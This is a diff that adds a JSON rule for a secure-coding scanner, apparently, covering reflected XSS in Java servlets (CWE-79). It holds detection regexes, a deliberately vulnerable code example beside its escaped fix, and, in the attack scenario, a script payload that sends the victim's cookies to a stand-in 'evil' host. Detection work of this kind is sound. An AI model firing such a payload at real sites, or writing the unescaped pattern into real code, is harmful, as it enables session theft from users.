@@ -1,0 +1,37 @@
+{
+  "cwe_id": "CWE-79",
+  "name": "Servlet reflected XSS via response writer",
+  "rank": 0,
+  "kev": false,
+  "task_triggers": [
+    "getWriter",
+    "servlet",
+    "response.print",
+    "httpservletresponse",
+    "render html",
+    "write response",
+    "print user input"
+  ],
+  "patterns": [
+    {
+      "lang": "java",
+      "confidence": "high",
+      "re": "\\.getWriter\\(\\)\\s*\\.(?:print|println|write)\\s*\\([^)]*\\+",
+      "reject_re": "htmlEscape|encodeForHTML|HtmlUtils|StringEscapeUtils|escapeHtml|ESAPI|encode\\("
+    },
+    {
+      "lang": "java",
+      "confidence": "high",
+      "re": "\\.getWriter\\(\\)\\s*\\.(?:print|println|write)\\s*\\(\\s*(?:request|req)\\s*\\.get"
+    }
+  ],
+  "attack_scenario": "Attacker lures a victim to /page?q=<script>document.location='//evil/'+document.cookie</script>; the unescaped value is reflected and the script runs in the victim's session.",
+  "negative_test_hint": [
+    "submit q = \"<script>alert(1)</script>\" and assert the response HTML-escapes the value instead of reflecting it verbatim"
+  ],
+  "exemplar": {
+    "noncompliant": "response.getWriter().println(\"<div>\" + request.getParameter(\"q\") + \"</div>\");",
+    "compliant": "response.getWriter().println(\"<div>\" + HtmlUtils.htmlEscape(request.getParameter(\"q\")) + \"</div>\");",
+    "explanation": "Writing request-derived data into the HTTP response via getWriter().print/write with no encoding reflects attacker HTML/JS into the victim's page, a classic reflected XSS. Contextually HTML-escaping user input (HtmlUtils.htmlEscape, OWASP encoder) or rendering through an auto-escaping template turns the markup into inert text."
+  }
+}
